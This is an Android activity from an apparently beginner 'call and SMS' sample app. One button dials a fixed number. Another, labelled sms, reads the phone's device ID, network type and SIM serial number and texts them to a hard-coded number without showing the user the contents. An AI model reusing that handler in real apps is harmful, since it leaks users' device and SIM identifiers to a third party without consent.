package com.example.callandsms;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.telecom.TelecomManager;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;

public class MainActivity extends AppCompatActivity {
    TelecomManager tm;
    TelephonyManager tlm;
    Button call, sms, facebook;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        call = (Button) findViewById(R.id.bu);
        sms = (Button) findViewById(R.id.bu1);
        facebook = (Button) findViewById(R.id.bu2);
        call.setOnClickListener(new View.OnClickListener() {
            @RequiresApi(api = Build.VERSION_CODES.M)
            @Override
            public void onClick(View view) {

                Intent in = new Intent(Intent.ACTION_CALL, Uri.parse("tel:+9116926204"));
                if (checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                    startActivity(in);
                }

            }
        });
        sms.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                tlm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                StringBuilder sb = new StringBuilder();

                if (ActivityCompat.checkSelfPermission(MainActivity.this,Manifest.permission.READ_PHONE_STATE)== PackageManager.PERMISSION_GRANTED) {
                    sb.append(tlm.getDeviceId() + "\n" +
                            tlm.getNetworkType() + "\n" +
                            tlm.getSimSerialNumber());

                    SmsManager sm=SmsManager.getDefault();
                    sm.sendTextMessage("+919116926294",null,sb.toString(),null,null);
                }


            }
        });
        facebook.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if(ActivityCompat.checkSelfPermission(MainActivity.this,Manifest.permission.INTERNET)==PackageManager.PERMISSION_GRANTED) {
                    Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse("https://www.google.com/"));
                    startActivity(i);
                }
            }
        });


    }
}
